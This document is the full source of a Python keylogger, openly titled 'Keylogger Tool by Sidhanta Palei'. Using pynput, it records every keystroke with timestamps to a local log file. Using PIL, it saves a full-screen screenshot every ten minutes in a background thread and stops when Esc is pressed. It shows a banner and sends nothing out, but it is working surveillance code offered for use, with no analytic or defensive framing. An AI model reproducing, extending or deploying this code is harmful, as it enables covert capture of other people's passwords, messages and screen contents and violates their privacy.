import os
import logging
import threading
from pynput import keyboard
from PIL import ImageGrab
from datetime import datetime

# ASCII Art Header
ascii_art = """
   _  _________   ___     ___   ____  ____ _____ ____  
 | |/ / ____\ \ / / |   / _ \ / ___|/ ___| ____|  _ \ 
 | ' /|  _|  \ V /| |  | | | | |  _| |  _|  _| | |_) |
 | . \| |___  | | | |__| |_| | |_| | |_| | |___|  _ < 
 |_|\_\_____| |_| |_____\___/ \____|\____|_____|_| \_\
                                                      
            Keylogger Tool by Sidhanta Palei
"""


# Configuration
BASE_DIR = 'keylogger_data'
LOG_FILE = os.path.join(BASE_DIR, 'keylog.txt')
SCREENSHOT_DIR = os.path.join(BASE_DIR, 'screenshots')

# Global flag to stop threads
stop_flag = threading.Event()

# Create directories and log file if they do not exist
def setup_directories_and_files():
    if not os.path.exists(BASE_DIR):
        os.makedirs(BASE_DIR)
    if not os.path.exists(SCREENSHOT_DIR):
        os.makedirs(SCREENSHOT_DIR)
    if not os.path.isfile(LOG_FILE):
        open(LOG_FILE, 'w').close()  # Create the log file if it does not exist

# Set up logging
def setup_logging(log_file):
    logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

# Capture screenshots
def capture_screenshot(screenshot_dir):
    while not stop_flag.is_set():
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        screenshot_path = os.path.join(screenshot_dir, f'screenshot_{timestamp}.png')
        img = ImageGrab.grab()
        img.save(screenshot_path)
        logging.info(f'Screenshot taken: {screenshot_path}')
        stop_flag.wait(600)  # Wait for 10 minutes

# Key press event
def on_press(key):
    try:
        logging.info(f'{key.char}')
    except AttributeError:
        logging.info(f'{key}')

# Key release event
def on_release(key):
    if key == keyboard.Key.esc:
        stop_flag.set()
        return False  # Stop listener

# Main function
def main():
    print(ascii_art)
    setup_directories_and_files()
    setup_logging(LOG_FILE)
    
    # Start screenshot capturing in a separate thread
    screenshot_thread = threading.Thread(target=capture_screenshot, args=(SCREENSHOT_DIR,))
    screenshot_thread.start()
    
    # Start keylogging
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
    
    # Wait for the screenshot thread to finish
    screenshot_thread.join()

if __name__ == "__main__":
    main()
